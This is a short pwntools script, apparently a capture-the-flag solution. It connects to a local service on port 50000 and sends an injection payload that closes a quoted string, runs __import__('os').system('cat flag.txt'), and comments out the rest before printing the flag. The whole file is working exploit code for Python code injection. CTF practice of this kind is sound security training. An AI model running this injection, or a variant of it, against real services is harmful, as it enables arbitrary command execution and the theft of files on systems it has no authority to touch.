#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 50000

io = remote(HOST, PORT, level='debug')
payload = '"'
payload += ';__import__("os").system("cat flag.txt")'
payload += '#'

io.sendline(payload.encode())

io.recvline()
flag = io.recvall().decode().strip()
log.info('Flag: %s', flag)
